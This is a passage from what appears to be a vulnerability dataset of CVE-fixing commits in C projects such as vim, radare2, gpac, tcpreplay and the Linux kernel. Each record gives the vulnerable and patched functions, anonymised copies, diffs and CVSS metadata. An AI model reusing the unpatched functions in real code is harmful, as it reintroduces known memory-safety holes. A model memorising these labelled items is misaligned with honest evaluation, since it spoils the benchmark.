    if (VAR_5 + 19 * 10 >= VAR_1->bits_per_row[0])
        return VAR_4;

    unsigned VAR_6 = VAR_1->bits_per_row[0] - VAR_5;
    VAR_6 = MIN(VAR_6, sizeof (VAR_3) * 8);

    int VAR_7 = extract_bytes_uart(VAR_1->bb[0], VAR_5, VAR_6, VAR_3);
    if (VAR_7 < 19)
        return VAR_8;

    if ((VAR_3[0] & 0xf0) != 0xf0)
        return VAR_4;

    int VAR_9 = VAR_3[0] & 0xf; /* COMMENT_1 */
    if (VAR_7 < 19 + VAR_9)
        return VAR_8;

    /* COMMENT_2 */
    if (crc16lsb(VAR_3, VAR_7, 0x8408, 0x0000) != 0) /* COMMENT_3 */
        return VAR_10;
    bitrow_printf(VAR_3, VAR_7 * 8, ""%s: offset %u, num_bits %u, len %d, msg_len %d\n"", VAR_11, VAR_5, VAR_6, VAR_7, VAR_9);

    int VAR_12 = (VAR_3[0]);
    int VAR_13   = ((unsigned)VAR_3[4] << 24) | (VAR_3[3] << 16) | (VAR_3[2] << 8) | (VAR_3[1]); /* COMMENT_4 */
    int VAR_14   = ((unsigned)VAR_3[8] << 24) | (VAR_3[7] << 16) | (VAR_3[6] << 8) | (VAR_3[5]); /* COMMENT_4 */
    int VAR_15  = (VAR_3[VAR_7 - 10] << 8) | (VAR_3[VAR_7 - 9]);
    char VAR_16[15 * 2 + 1];
    bitrow_snprint(&VAR_3[9], VAR_9 * 8, VAR_16, 15 * 2 + 1);
    char VAR_17[13];
    bitrow_snprint(&VAR_3[VAR_7 - 8], 6 * 8, VAR_17, 13);

    /* COMMENT_5 */
    data_t *VAR_18 = data_make(
            ""model"",            """",                 VAR_19, ""Somfy-IOHC"",
            ""id"",               """",                 VAR_20, ""%08x"", VAR_21, VAR_14,
            ""dst_id"",           ""Dest ID"",          VAR_20, ""%08x"", VAR_21, VAR_13,
            ""msg_type"",         ""Msg type"",         VAR_20, ""%02x"", VAR_21, VAR_12,
            ""msg"",              ""Message"",          VAR_19, VAR_16,
            ""counter"",          ""Counter"",          VAR_21,    VAR_15,
            ""mac"",              ""MAC"",              VAR_19, VAR_17,
            ""mic"",              ""Integrity"",        VAR_19, ""CRC"",
            NULL);
    /* COMMENT_6 */

    decoder_output_data(VAR_0, VAR_18);
    return 1;
}",merbanan/rtl_433/2dad7b9fc67a1d0bfbe520fbd821678b8f8cc7a8/somfy_iohc.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -7,11 +7,12 @@
     if (bitbuffer->num_rows != 1)
         return DECODE_ABORT_EARLY;
 
-    int offset = bitbuffer_search(bitbuffer, 0, 0, preamble_pattern, 24) + 24;
-    if (offset >= bitbuffer->bits_per_row[0] - 19 * 10)
+    unsigned offset = bitbuffer_search(bitbuffer, 0, 0, preamble_pattern, 24) + 24;
+    if (offset + 19 * 10 >= bitbuffer->bits_per_row[0])
         return DECODE_ABORT_EARLY;
 
-    int num_bits = bitbuffer->bits_per_row[0] - offset;
+    unsigned num_bits = bitbuffer->bits_per_row[0] - offset;
+    num_bits = MIN(num_bits, sizeof (b) * 8);
 
     int len = extract_bytes_uart(bitbuffer->bb[0], offset, num_bits, b);
     if (len < 19)
@@ -27,7 +28,7 @@
     // calculate and verify checksum
     if (crc16lsb(b, len, 0x8408, 0x0000) != 0) // unreflected poly 0x1021
         return DECODE_FAIL_MIC;
-    bitrow_printf(b, len * 8, ""%s: offset %d, num_bits %d, len %d, msg_len %d\n"", __func__, offset, num_bits, len, msg_len);
+    bitrow_printf(b, len * 8, ""%s: offset %u, num_bits %u, len %d, msg_len %d\n"", __func__, offset, num_bits, len, msg_len);
 
     int msg_type = (b[0]);
     int dst_id   = ((unsigned)b[4] << 24) | (b[3] << 16) | (b[2] << 8) | (b[1]); // assume Little-Endian","{'deleted_lines': ['    int offset = bitbuffer_search(bitbuffer, 0, 0, preamble_pattern, 24) + 24;', '    if (offset >= bitbuffer->bits_per_row[0] - 19 * 10)', '    int num_bits = bitbuffer->bits_per_row[0] - offset;', '    bitrow_printf(b, len * 8, ""%s: offset %d, num_bits %d, len %d, msg_len %d\\n"", __func__, offset, num_bits, len, msg_len);'], 'added_lines': ['    unsigned offset = bitbuffer_search(bitbuffer, 0, 0, preamble_pattern, 24) + 24;', '    if (offset + 19 * 10 >= bitbuffer->bits_per_row[0])', '    unsigned num_bits = bitbuffer->bits_per_row[0] - offset;', '    num_bits = MIN(num_bits, sizeof (b) * 8);', '    bitrow_printf(b, len * 8, ""%s: offset %u, num_bits %u, len %d, msg_len %d\\n"", __func__, offset, num_bits, len, msg_len);']}",True,rtl_433 21.12 was discovered to contain a stack overflow in the function somfy_iohc_decode(). This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted file.,5.5,MEDIUM,1,valid,2022-01-24T14:53:20Z,4
CVE-2022-0393,['CWE-125'],AV:N/AC:M/Au:N/C:P/I:N/A:P,0,vim,"patch 8.2.4233: crash when recording and using Select mode

Problem:    Crash when recording and using Select mode.
Solution:   When deleting the last recorded character check there is something
            to delete.",a4bc2dd7cccf5a4a9f78b58b6f35a45d17164323,https://github.com/vim/vim/commit/a4bc2dd7cccf5a4a9f78b58b6f35a45d17164323,src/getchar.c,delete_buff_tail,"static void
delete_buff_tail(buffheader_T *buf, int slen)
{
int len = (int)STRLEN(buf->bh_curr->b_str);
if (len >= slen)
{
buf->bh_curr->b_str[len - slen] = NUL;
buf->bh_space += slen;
}
}","static void
delete_buff_tail(buffheader_T *VAR_0, int VAR_1)
{
int VAR_2 = (int)STRLEN(VAR_0->bh_curr->b_str);
if (VAR_2 >= VAR_1)
{
VAR_0->bh_curr->b_str[VAR_2 - VAR_1] = VAR_3;
VAR_0->bh_space += VAR_1;
}
}",vim/a4bc2dd7cccf5a4a9f78b58b6f35a45d17164323/getchar.c/vul/before/0.json,"static void
delete_buff_tail(buffheader_T *buf, int slen)
{
    int len;

    if (buf->bh_curr == NULL || buf->bh_curr->b_str == NULL)
	return;  // nothing to delete
    len = (int)STRLEN(buf->bh_curr->b_str);
    if (len >= slen)
    {
	buf->bh_curr->b_str[len - slen] = NUL;
	buf->bh_space += slen;
    }
}","static void
delete_buff_tail(buffheader_T *VAR_0, int VAR_1)
{
    int VAR_2;

    if (VAR_0->bh_curr == NULL || VAR_0->bh_curr->b_str == NULL)
	return;  /* COMMENT_0 */
    VAR_2 = (int)STRLEN(VAR_0->bh_curr->b_str);
    if (VAR_2 >= VAR_1)
    {
	VAR_0->bh_curr->b_str[VAR_2 - VAR_1] = VAR_3;
	VAR_0->bh_space += VAR_1;
    }
}",vim/a4bc2dd7cccf5a4a9f78b58b6f35a45d17164323/getchar.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,8 +1,11 @@
 static void
 delete_buff_tail(buffheader_T *buf, int slen)
 {
-    int len = (int)STRLEN(buf->bh_curr->b_str);
+    int len;
 
+    if (buf->bh_curr == NULL || buf->bh_curr->b_str == NULL)
+	return;  // nothing to delete
+    len = (int)STRLEN(buf->bh_curr->b_str);
     if (len >= slen)
     {
 	buf->bh_curr->b_str[len - slen] = NUL;","{'deleted_lines': ['    int len = (int)STRLEN(buf->bh_curr->b_str);'], 'added_lines': ['    int len;', '    if (buf->bh_curr == NULL || buf->bh_curr->b_str == NULL)', '\treturn;  // nothing to delete', '    len = (int)STRLEN(buf->bh_curr->b_str);']}",True,Out-of-bounds Read in GitHub repository vim/vim prior to 8.2.,7.1,HIGH,2,valid,2022-01-27T19:27:16Z,4
CVE-2022-0419,['CWE-476'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,radareorg/radare2,"Fix null deref in xnu.kernelcache ##crash

* Reported by @xshad3 via huntr.dev",feaa4e7f7399c51ee6f52deb84dc3f795b4035d6,https://github.com/radareorg/radare2/commit/feaa4e7f7399c51ee6f52deb84dc3f795b4035d6,libr/bin/p/bin_xnu_kernelcache.c,load_buffer,"static bool load_buffer(RBinFile *bf, void **bin_obj, RBuffer *buf, ut64 loadaddr, Sdb *sdb) {
RBuffer *fbuf = r_buf_ref (buf);
struct MACH0_(opts_t) opts;
MACH0_(opts_set_default) (&opts, bf);
struct MACH0_(obj_t) *main_mach0 = MACH0_(new_buf) (fbuf, &opts);
if (!main_mach0) {
return false;
}
RRebaseInfo *rebase_info = r_rebase_info_new_from_mach0 (fbuf, main_mach0);
RKernelCacheObj *obj = NULL;
RPrelinkRange *prelink_range = get_prelink_info_range_from_mach0 (main_mach0);
if (!prelink_range) {
goto beach;
}
obj = R_NEW0 (RKernelCacheObj);
if (!obj) {
R_FREE (prelink_range);
goto beach;
}
RCFValueDict *prelink_info = NULL;
if (main_mach0->hdr.filetype != MH_FILESET && prelink_range->range.size) {
prelink_info = r_cf_value_dict_parse (fbuf, prelink_range->range.offset,
prelink_range->range.size, R_CF_OPTION_SKIP_NSDATA);
if (!prelink_info) {
R_FREE (prelink_range);
R_FREE (obj);
goto beach;
}
}
if (!pending_bin_files) {
pending_bin_files = r_list_new ();
if (!pending_bin_files) {
R_FREE (prelink_range);
R_FREE (obj);
R_FREE (prelink_info);
goto beach;
}
}
obj->mach0 = main_mach0;
obj->rebase_info = rebase_info;
obj->prelink_info = prelink_info;
obj->cache_buf = fbuf;
obj->pa2va_exec = prelink_range->pa2va_exec;
obj->pa2va_data = prelink_range->pa2va_data;
R_FREE (prelink_range);
*bin_obj = obj;
r_list_push (pending_bin_files, bf);
if (rebase_info || main_mach0->chained_starts) {
RIO *io = bf->rbin->iob.io;
swizzle_io_read (obj, io);
}
return true;
beach:
r_buf_free (fbuf);
obj->cache_buf = NULL;
MACH0_(mach0_free) (main_mach0);
return false;
}","static bool load_buffer(RBinFile *VAR_0, void **VAR_1, RBuffer *VAR_2, ut64 VAR_3, Sdb *VAR_4) {
RBuffer *VAR_5 = r_buf_ref (VAR_2);
struct MACH0_(VAR_6) VAR_7;
MACH0_(VAR_8) (&VAR_7, VAR_0);
struct MACH0_(VAR_9) *VAR_10 = MACH0_(VAR_11) (VAR_5, &VAR_7);
if (!VAR_10) {
return false;
}
RRebaseInfo *VAR_12 = r_rebase_info_new_from_mach0 (VAR_5, VAR_10);
RKernelCacheObj *VAR_13 = NULL;
RPrelinkRange *VAR_14 = get_prelink_info_range_from_mach0 (VAR_10);
if (!VAR_14) {
goto beach;
}
VAR_13 = R_NEW0 (RKernelCacheObj);
if (!VAR_13) {
R_FREE (VAR_14);
goto beach;
}
RCFValueDict *VAR_15 = NULL;
if (VAR_10->hdr.filetype != VAR_16 && VAR_14->range.size) {
VAR_15 = r_cf_value_dict_parse (VAR_5, VAR_14->range.offset,
VAR_14->range.size, VAR_17);
if (!VAR_15) {
R_FREE (VAR_14);
R_FREE (VAR_13);
goto beach;
}
}
if (!VAR_18) {
VAR_18 = r_list_new ();
if (!VAR_18) {
R_FREE (VAR_14);
R_FREE (VAR_13);
R_FREE (VAR_15);
goto beach;
}
}
VAR_13->mach0 = VAR_10;
VAR_13->rebase_info = VAR_12;
VAR_13->prelink_info = VAR_15;
VAR_13->cache_buf = VAR_5;
VAR_13->pa2va_exec = VAR_14->pa2va_exec;
VAR_13->pa2va_data = VAR_14->pa2va_data;
R_FREE (VAR_14);
*VAR_1 = VAR_13;
r_list_push (VAR_18, VAR_0);
if (VAR_12 || VAR_10->chained_starts) {
RIO *VAR_19 = VAR_0->rbin->iob.io;
swizzle_io_read (VAR_13, VAR_19);
}
return true;
beach:
r_buf_free (VAR_5);
VAR_13->cache_buf = NULL;
MACH0_(VAR_20) (VAR_10);
return false;
}",radareorg/radare2/feaa4e7f7399c51ee6f52deb84dc3f795b4035d6/bin_xnu_kernelcache.c/vul/before/0.json,"static bool load_buffer(RBinFile *bf, void **bin_obj, RBuffer *buf, ut64 loadaddr, Sdb *sdb) {
	RBuffer *fbuf = r_buf_ref (buf);
	struct MACH0_(opts_t) opts;
	MACH0_(opts_set_default) (&opts, bf);
	struct MACH0_(obj_t) *main_mach0 = MACH0_(new_buf) (fbuf, &opts);
	if (!main_mach0) {
		return false;
	}

	RRebaseInfo *rebase_info = r_rebase_info_new_from_mach0 (fbuf, main_mach0);
	RKernelCacheObj *obj = NULL;

	RPrelinkRange *prelink_range = get_prelink_info_range_from_mach0 (main_mach0);
	if (!prelink_range) {
		goto beach;
	}

	obj = R_NEW0 (RKernelCacheObj);
	if (!obj) {
		R_FREE (prelink_range);
		goto beach;
	}

	RCFValueDict *prelink_info = NULL;
	if (main_mach0->hdr.filetype != MH_FILESET && prelink_range->range.size) {
		prelink_info = r_cf_value_dict_parse (fbuf, prelink_range->range.offset,
				prelink_range->range.size, R_CF_OPTION_SKIP_NSDATA);
		if (!prelink_info) {
			R_FREE (prelink_range);
			R_FREE (obj);
			goto beach;
		}
	}

	if (!pending_bin_files) {
		pending_bin_files = r_list_new ();
		if (!pending_bin_files) {
			R_FREE (prelink_range);
			R_FREE (obj);
			R_FREE (prelink_info);
			goto beach;
		}
	}

	obj->mach0 = main_mach0;
	obj->rebase_info = rebase_info;
	obj->prelink_info = prelink_info;
	obj->cache_buf = fbuf;
	obj->pa2va_exec = prelink_range->pa2va_exec;
	obj->pa2va_data = prelink_range->pa2va_data;

	R_FREE (prelink_range);

	*bin_obj = obj;

	r_list_push (pending_bin_files, bf);

	if (rebase_info || main_mach0->chained_starts) {
		RIO *io = bf->rbin->iob.io;
		swizzle_io_read (obj, io);
	}

	return true;

beach:
	r_buf_free (fbuf);
	if (obj) {
		obj->cache_buf = NULL;
	}
	MACH0_(mach0_free) (main_mach0);
	return false;
}","static bool load_buffer(RBinFile *VAR_0, void **VAR_1, RBuffer *VAR_2, ut64 VAR_3, Sdb *VAR_4) {
	RBuffer *VAR_5 = r_buf_ref (VAR_2);
	struct MACH0_(VAR_6) VAR_7;
	MACH0_(VAR_8) (&VAR_7, VAR_0);
	struct MACH0_(VAR_9) *VAR_10 = MACH0_(VAR_11) (VAR_5, &VAR_7);
	if (!VAR_10) {
		return false;
	}

	RRebaseInfo *VAR_12 = r_rebase_info_new_from_mach0 (VAR_5, VAR_10);
	RKernelCacheObj *VAR_13 = NULL;

	RPrelinkRange *VAR_14 = get_prelink_info_range_from_mach0 (VAR_10);
	if (!VAR_14) {
		goto beach;
	}

	VAR_13 = R_NEW0 (RKernelCacheObj);
	if (!VAR_13) {
		R_FREE (VAR_14);
		goto beach;
	}

	RCFValueDict *VAR_15 = NULL;
	if (VAR_10->hdr.filetype != VAR_16 && VAR_14->range.size) {
		VAR_15 = r_cf_value_dict_parse (VAR_5, VAR_14->range.offset,
				VAR_14->range.size, VAR_17);
		if (!VAR_15) {
			R_FREE (VAR_14);
			R_FREE (VAR_13);
			goto beach;
		}
	}

	if (!VAR_18) {
		VAR_18 = r_list_new ();
		if (!VAR_18) {
			R_FREE (VAR_14);
			R_FREE (VAR_13);
			R_FREE (VAR_15);
			goto beach;
		}
	}

	VAR_13->mach0 = VAR_10;
	VAR_13->rebase_info = VAR_12;
	VAR_13->prelink_info = VAR_15;
	VAR_13->cache_buf = VAR_5;
	VAR_13->pa2va_exec = VAR_14->pa2va_exec;
	VAR_13->pa2va_data = VAR_14->pa2va_data;

	R_FREE (VAR_14);

	*VAR_1 = VAR_13;

	r_list_push (VAR_18, VAR_0);

	if (VAR_12 || VAR_10->chained_starts) {
		RIO *VAR_19 = VAR_0->rbin->iob.io;
		swizzle_io_read (VAR_13, VAR_19);
	}

	return true;

beach:
	r_buf_free (VAR_5);
	if (VAR_13) {
		VAR_13->cache_buf = NULL;
	}
	MACH0_(VAR_20) (VAR_10);
	return false;
}",radareorg/radare2/feaa4e7f7399c51ee6f52deb84dc3f795b4035d6/bin_xnu_kernelcache.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -64,7 +64,9 @@
 
 beach:
 	r_buf_free (fbuf);
-	obj->cache_buf = NULL;
+	if (obj) {
+		obj->cache_buf = NULL;
+	}
 	MACH0_(mach0_free) (main_mach0);
 	return false;
 }","{'deleted_lines': ['\tobj->cache_buf = NULL;'], 'added_lines': ['\tif (obj) {', '\t\tobj->cache_buf = NULL;', '\t}']}",True,NULL Pointer Dereference in GitHub repository radareorg/radare2 prior to 5.6.0.,5.5,MEDIUM,1,valid,2022-01-31T01:32:50Z,4
CVE-2021-4043,['CWE-476'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #2092,64a2e1b799352ac7d7aad1989bc06e7b0f2b01db,https://github.com/gpac/gpac/commit/64a2e1b799352ac7d7aad1989bc06e7b0f2b01db,src/isomedia/box_code_base.c,gitn_box_del,"void gitn_box_del(GF_Box *s)
{
u32 i;
GroupIdToNameBox *ptr = (GroupIdToNameBox *)s;
if (ptr == NULL) return;
for (i=0; i<ptr->nb_entries; i++) {
if (ptr->entries[i].name) gf_free(ptr->entries[i].name);
}
if (ptr->entries) gf_free(ptr->entries);
gf_free(ptr);
}","void gitn_box_del(GF_Box *VAR_0)
{
u32 VAR_1;
GroupIdToNameBox *VAR_2 = (GroupIdToNameBox *)VAR_0;
if (VAR_2 == NULL) return;
for (VAR_1=0; VAR_1<VAR_2->nb_entries; VAR_1++) {
if (VAR_2->entries[VAR_1].name) gf_free(VAR_2->entries[VAR_1].name);
}
if (VAR_2->entries) gf_free(VAR_2->entries);
gf_free(VAR_2);
}",gpac/64a2e1b799352ac7d7aad1989bc06e7b0f2b01db/box_code_base.c/vul/before/0.json,"void gitn_box_del(GF_Box *s)
{
	u32 i;
	GroupIdToNameBox *ptr = (GroupIdToNameBox *)s;
	if (ptr == NULL) return;
	if (ptr->entries) {
		for (i=0; i<ptr->nb_entries; i++) {
			if (ptr->entries[i].name) gf_free(ptr->entries[i].name);
		}
		gf_free(ptr->entries);
	}
	gf_free(ptr);
}","void gitn_box_del(GF_Box *VAR_0)
{
	u32 VAR_1;
	GroupIdToNameBox *VAR_2 = (GroupIdToNameBox *)VAR_0;
	if (VAR_2 == NULL) return;
	if (VAR_2->entries) {
		for (VAR_1=0; VAR_1<VAR_2->nb_entries; VAR_1++) {
			if (VAR_2->entries[VAR_1].name) gf_free(VAR_2->entries[VAR_1].name);
		}
		gf_free(VAR_2->entries);
	}
	gf_free(VAR_2);
}",gpac/64a2e1b799352ac7d7aad1989bc06e7b0f2b01db/box_code_base.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -3,9 +3,11 @@
 	u32 i;
 	GroupIdToNameBox *ptr = (GroupIdToNameBox *)s;
 	if (ptr == NULL) return;
-	for (i=0; i<ptr->nb_entries; i++) {
-		if (ptr->entries[i].name) gf_free(ptr->entries[i].name);
+	if (ptr->entries) {
+		for (i=0; i<ptr->nb_entries; i++) {
+			if (ptr->entries[i].name) gf_free(ptr->entries[i].name);
+		}
+		gf_free(ptr->entries);
 	}
-	if (ptr->entries) gf_free(ptr->entries);
 	gf_free(ptr);
 }","{'deleted_lines': ['\tfor (i=0; i<ptr->nb_entries; i++) {', '\t\tif (ptr->entries[i].name) gf_free(ptr->entries[i].name);', '\tif (ptr->entries) gf_free(ptr->entries);'], 'added_lines': ['\tif (ptr->entries) {', '\t\tfor (i=0; i<ptr->nb_entries; i++) {', '\t\t\tif (ptr->entries[i].name) gf_free(ptr->entries[i].name);', '\t\t}', '\t\tgf_free(ptr->entries);']}",True,NULL Pointer Dereference in GitHub repository gpac/gpac prior to 1.1.0.,5.5,MEDIUM,1,valid,2022-02-01T14:28:23Z,4
CVE-2022-25375,['CWE-1284'],AV:L/AC:L/Au:N/C:P/I:N/A:N,0,torvalds/linux,"usb: gadget: rndis: check size of RNDIS_MSG_SET command

Check the size of the RNDIS_MSG_SET command given to us before
attempting to respond to an invalid message size.

Reported-by: Szymon Heidrich <szymon.heidrich@gmail.com>
Cc: stable@kernel.org
Tested-by: Szymon Heidrich <szymon.heidrich@gmail.com>
Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",38ea1eac7d88072bbffb630e2b3db83ca649b826,https://github.com/torvalds/linux/commit/38ea1eac7d88072bbffb630e2b3db83ca649b826,drivers/usb/gadget/function/rndis.c,rndis_set_response,"static int rndis_set_response(struct rndis_params *params,
rndis_set_msg_type *buf)
{
u32 BufLength, BufOffset;
rndis_set_cmplt_type *resp;
rndis_resp_t *r;
r = rndis_add_response(params, sizeof(rndis_set_cmplt_type));
if (!r)
return -ENOMEM;
resp = (rndis_set_cmplt_type *)r->buf;
BufLength = le32_to_cpu(buf->InformationBufferLength);
BufOffset = le32_to_cpu(buf->InformationBufferOffset);
#ifdefVERBOSE_DEBUG
pr_debug(""%s: Length: %d\n"", __func__, BufLength);
pr_debug(""%s: Offset: %d\n"", __func__, BufOffset);
pr_debug(""%s: InfoBuffer: "", __func__);
for (i = 0; i < BufLength; i++) {
pr_debug(""%02x "", *(((u8 *) buf) + i + 8 + BufOffset));
}
pr_debug(""\n"");
#endif
resp->MessageType = cpu_to_le32(RNDIS_MSG_SET_C);
resp->MessageLength = cpu_to_le32(16);
resp->RequestID = buf->RequestID; 
if (gen_ndis_set_resp(params, le32_to_cpu(buf->OID),
((u8 *)buf) + 8 + BufOffset, BufLength, r))
resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);
else
resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);
params->resp_avail(params->v);
return 0;
}","static int rndis_set_response(struct rndis_params *VAR_0,
rndis_set_msg_type *VAR_1)
{
u32 VAR_2, VAR_3;
rndis_set_cmplt_type *VAR_4;
rndis_resp_t *VAR_5;
VAR_5 = rndis_add_response(VAR_0, sizeof(rndis_set_cmplt_type));
if (!VAR_5)
return -VAR_6;
VAR_4 = (rndis_set_cmplt_type *)VAR_5->buf;
VAR_2 = le32_to_cpu(VAR_1->InformationBufferLength);
VAR_3 = le32_to_cpu(VAR_1->InformationBufferOffset);
#ifdefVAR_7
pr_debug(""%s: Length: %d\n"", VAR_8, VAR_2);
pr_debug(""%s: Offset: %d\n"", VAR_8, VAR_3);
pr_debug(""%s: InfoBuffer: "", VAR_8);
for (VAR_9 = 0; VAR_9 < VAR_2; VAR_9++) {
pr_debug(""%02x "", *(((u8 *) VAR_1) + VAR_9 + 8 + VAR_3));
}
pr_debug(""\n"");
#endif
VAR_4->MessageType = cpu_to_le32(VAR_10);
VAR_4->MessageLength = cpu_to_le32(16);
VAR_4->RequestID = VAR_1->RequestID; 
if (gen_ndis_set_resp(VAR_0, le32_to_cpu(VAR_1->OID),
((u8 *)VAR_1) + 8 + VAR_3, VAR_2, VAR_5))
VAR_4->Status = cpu_to_le32(VAR_11);
else
VAR_4->Status = cpu_to_le32(VAR_12);
VAR_0->resp_avail(VAR_0->v);
return 0;
}",torvalds/linux/38ea1eac7d88072bbffb630e2b3db83ca649b826/rndis.c/vul/before/0.json,"static int rndis_set_response(struct rndis_params *params,
			      rndis_set_msg_type *buf)
{
	u32 BufLength, BufOffset;
	rndis_set_cmplt_type *resp;
	rndis_resp_t *r;

	BufLength = le32_to_cpu(buf->InformationBufferLength);
	BufOffset = le32_to_cpu(buf->InformationBufferOffset);
	if ((BufLength > RNDIS_MAX_TOTAL_SIZE) ||
	    (BufOffset + 8 >= RNDIS_MAX_TOTAL_SIZE))
		    return -EINVAL;

	r = rndis_add_response(params, sizeof(rndis_set_cmplt_type));
	if (!r)
		return -ENOMEM;
	resp = (rndis_set_cmplt_type *)r->buf;

#ifdef	VERBOSE_DEBUG
	pr_debug(""%s: Length: %d\n"", __func__, BufLength);
	pr_debug(""%s: Offset: %d\n"", __func__, BufOffset);
	pr_debug(""%s: InfoBuffer: "", __func__);

	for (i = 0; i < BufLength; i++) {
		pr_debug(""%02x "", *(((u8 *) buf) + i + 8 + BufOffset));
	}

	pr_debug(""\n"");
#endif

	resp->MessageType = cpu_to_le32(RNDIS_MSG_SET_C);
	resp->MessageLength = cpu_to_le32(16);
	resp->RequestID = buf->RequestID; /* Still LE in msg buffer */
	if (gen_ndis_set_resp(params, le32_to_cpu(buf->OID),
			((u8 *)buf) + 8 + BufOffset, BufLength, r))
		resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);
	else
		resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);

	params->resp_avail(params->v);
	return 0;
}","static int rndis_set_response(struct rndis_params *VAR_0,
			      rndis_set_msg_type *VAR_1)
{
	u32 VAR_2, VAR_3;
	rndis_set_cmplt_type *VAR_4;
	rndis_resp_t *VAR_5;

	VAR_2 = le32_to_cpu(VAR_1->InformationBufferLength);
	VAR_3 = le32_to_cpu(VAR_1->InformationBufferOffset);
	if ((VAR_2 > VAR_6) ||
	    (VAR_3 + 8 >= VAR_6))
		    return -VAR_7;

	VAR_5 = rndis_add_response(VAR_0, sizeof(rndis_set_cmplt_type));
	if (!VAR_5)
		return -VAR_8;
	VAR_4 = (rndis_set_cmplt_type *)VAR_5->buf;

#ifdef	VAR_9
	pr_debug(""%s: Length: %d\n"", VAR_10, VAR_2);
	pr_debug(""%s: Offset: %d\n"", VAR_10, VAR_3);
	pr_debug(""%s: InfoBuffer: "", VAR_10);

	for (VAR_11 = 0; VAR_11 < VAR_2; VAR_11++) {
		pr_debug(""%02x "", *(((u8 *) VAR_1) + VAR_11 + 8 + VAR_3));
	}

	pr_debug(""\n"");
#endif

	VAR_4->MessageType = cpu_to_le32(VAR_12);
	VAR_4->MessageLength = cpu_to_le32(16);
	VAR_4->RequestID = VAR_1->RequestID; /* COMMENT_0 */
	if (gen_ndis_set_resp(VAR_0, le32_to_cpu(VAR_1->OID),
			((u8 *)VAR_1) + 8 + VAR_3, VAR_2, VAR_5))
		VAR_4->Status = cpu_to_le32(VAR_13);
	else
		VAR_4->Status = cpu_to_le32(VAR_14);

	VAR_0->resp_avail(VAR_0->v);
	return 0;
}",torvalds/linux/38ea1eac7d88072bbffb630e2b3db83ca649b826/rndis.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -5,13 +5,16 @@
 	rndis_set_cmplt_type *resp;
 	rndis_resp_t *r;
 
+	BufLength = le32_to_cpu(buf->InformationBufferLength);
+	BufOffset = le32_to_cpu(buf->InformationBufferOffset);
+	if ((BufLength > RNDIS_MAX_TOTAL_SIZE) ||
+	    (BufOffset + 8 >= RNDIS_MAX_TOTAL_SIZE))
+		    return -EINVAL;
+
 	r = rndis_add_response(params, sizeof(rndis_set_cmplt_type));
 	if (!r)
 		return -ENOMEM;
 	resp = (rndis_set_cmplt_type *)r->buf;
-
-	BufLength = le32_to_cpu(buf->InformationBufferLength);
-	BufOffset = le32_to_cpu(buf->InformationBufferOffset);
 
 #ifdef	VERBOSE_DEBUG
 	pr_debug(""%s: Length: %d\n"", __func__, BufLength);","{'deleted_lines': ['', '\tBufLength = le32_to_cpu(buf->InformationBufferLength);', '\tBufOffset = le32_to_cpu(buf->InformationBufferOffset);'], 'added_lines': ['\tBufLength = le32_to_cpu(buf->InformationBufferLength);', '\tBufOffset = le32_to_cpu(buf->InformationBufferOffset);', '\tif ((BufLength > RNDIS_MAX_TOTAL_SIZE) ||', '\t    (BufOffset + 8 >= RNDIS_MAX_TOTAL_SIZE))', '\t\t    return -EINVAL;', '']}",True,An issue was discovered in drivers/usb/gadget/function/rndis.c in the Linux kernel before 5.16.10. The RNDIS USB gadget lacks validation of the size of the RNDIS_MSG_SET command. Attackers can obtain sensitive information from kernel memory.,5.5,MEDIUM,1,valid,2022-02-09T15:37:53Z,4
CVE-2022-27418,['CWE-787'],AV:N/AC:H/Au:N/C:P/I:P/A:P,0,appneta/tcpreplay,Bug #703 safeguard against corrupt packet lengths in checksum functions,e2ac765a25e902728b6d4a825358aa536e6668c2,https://github.com/appneta/tcpreplay/commit/e2ac765a25e902728b6d4a825358aa536e6668c2,src/tcpedit/edit_packet.c,ipv6_header_length,"static int
ipv6_header_length(ipv6_hdr_t const * ip6_hdr, int pkt_len)
{
struct tcpr_ipv6_ext_hdr_base const * nhdr;
uint8_t next_header;
int offset;
offset = sizeof(*ip6_hdr);
next_header = ip6_hdr->ip_nh;
while (sizeof(*nhdr) + offset < (size_t)pkt_len)
{
if (next_header != TCPR_IPV6_NH_HBH
&& next_header != TCPR_IPV6_NH_ROUTING
&& next_header != TCPR_IPV6_NH_FRAGMENT) {
return offset;
}
nhdr = (struct tcpr_ipv6_ext_hdr_base const *) (((uint8_t const *)ip6_hdr) + offset);
next_header = nhdr->ip_nh;
offset += ((nhdr->ip_len + 1) << 3);
}
return -1;
}","static int
ipv6_header_length(ipv6_hdr_t const * VAR_0, int VAR_1)
{
struct tcpr_ipv6_ext_hdr_base const * VAR_2;
uint8_t VAR_3;
int VAR_4;
VAR_4 = sizeof(*VAR_0);
VAR_3 = VAR_0->ip_nh;
while (sizeof(*VAR_2) + VAR_4 < (size_t)VAR_1)
{
if (VAR_3 != VAR_5
&& VAR_3 != VAR_6
&& VAR_3 != VAR_7) {
return VAR_4;
}
VAR_2 = (struct tcpr_ipv6_ext_hdr_base const *) (((uint8_t const *)VAR_0) + VAR_4);
VAR_3 = VAR_2->ip_nh;
VAR_4 += ((VAR_2->ip_len + 1) << 3);
}
return -1;
}",appneta/tcpreplay/e2ac765a25e902728b6d4a825358aa536e6668c2/edit_packet.c/vul/before/2.json,"static int
ipv6_header_length(ipv6_hdr_t const * ip6_hdr, const size_t pkt_len,
                   const size_t l2len)
{
    struct tcpr_ipv6_ext_hdr_base const * nhdr;
    uint8_t next_header;
    int offset;

    offset = sizeof(*ip6_hdr);
    next_header = ip6_hdr->ip_nh;

    while (sizeof(*nhdr) + offset + l2len < (size_t)pkt_len) {
        if (next_header != TCPR_IPV6_NH_HBH
                && next_header != TCPR_IPV6_NH_ROUTING
                && next_header != TCPR_IPV6_NH_FRAGMENT) {
            return offset;
        }

        nhdr = (struct tcpr_ipv6_ext_hdr_base const *) (((uint8_t const *)ip6_hdr) + offset);
        next_header = nhdr->ip_nh;
